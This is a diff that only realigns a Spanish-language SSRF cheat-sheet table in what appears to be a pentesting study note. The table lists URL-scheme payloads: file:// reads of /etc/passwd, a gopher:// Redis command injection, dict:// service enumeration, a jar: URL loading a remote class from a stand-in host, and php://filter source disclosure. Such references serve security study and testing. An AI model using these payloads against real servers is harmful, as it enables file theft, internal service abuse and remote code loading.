@@ -21,18 +21,18 @@ linked:
 
 ## Cheatsheet
 
-| **Protocolo** | **Payload** | **Capacidad** |
-|:---:|:---:|---|
-| **`file://`** | `file:///etc/passwd`, `file:///C:/Windows/win.ini` | Lectura arbitraria de archivos locales al backend. |
-| **`gopher://`** | `gopher://127.0.0.1:6379/_%0d%0aSET%20x%20evil` | Raw TCP — inyectar comandos Redis/SMTP/MySQL crudos. |
-| **`dict://`** | `dict://127.0.0.1:11211/stats` | Enum servicios basados en texto (memcached, redis). |
-| **`ftp://`** | `ftp://127.0.0.1/` | Fetch desde FTP interno, credenciales en URL. |
-| **`ldap://`** | `ldap://127.0.0.1:389/dc=internal` | Bind / búsquedas LDAP internas. |
-| **`tftp://`** | `tftp://127.0.0.1:69/flag` | UDP file retrieval. |
-| **`sftp://`** | `sftp://user:pass@127.0.0.1/file` | SFTP con creds si known. |
-| **`jar://`** (Java) | `jar:http://atk/x.jar!/` | Java-specific — carga clase remota. |
-| **`netdoc://`** (Java) | `netdoc:///etc/passwd` | Fallback a file:// en Java. |
-| **`php://filter`** | `php://filter/convert.base64-encode/resource=index.php` | Solo si backend es PHP con `allow_url_include`. |
+|     **Protocolo**      |                       **Payload**                       | **Capacidad**                                        |
+| :--------------------: | :-----------------------------------------------------: | ---------------------------------------------------- |
+|     **`file://`**      |   `file:///etc/passwd`, `file:///C:/Windows/win.ini`    | Lectura arbitraria de archivos locales al backend.   |
+|    **`gopher://`**     |     `gopher://127.0.0.1:6379/_%0d%0aSET%20x%20evil`     | Raw TCP — inyectar comandos Redis/SMTP/MySQL crudos. |
+|     **`dict://`**      |             `dict://127.0.0.1:11211/stats`              | Enum servicios basados en texto (memcached, redis).  |
+|      **`ftp://`**      |                   `ftp://127.0.0.1/`                    | Fetch desde FTP interno, credenciales en URL.        |
+|     **`ldap://`**      |           `ldap://127.0.0.1:389/dc=internal`            | Bind / búsquedas LDAP internas.                      |
+|     **`tftp://`**      |               `tftp://127.0.0.1:69/flag`                | UDP file retrieval.                                  |
+|     **`sftp://`**      |            `sftp://user:pass@127.0.0.1/file`            | SFTP con creds si known.                             |
+|  **`jar://`** (Java)   |                `jar:http://atk/x.jar!/`                 | Java-specific — carga clase remota.                  |
+| **`netdoc://`** (Java) |                 `netdoc:///etc/passwd`                  | Fallback a file:// en Java.                          |
+|   **`php://filter`**   | `php://filter/convert.base64-encode/resource=index.php` | Solo si backend es PHP con `allow_url_include`.      |
 ^ssrf-protocols
 
 ___
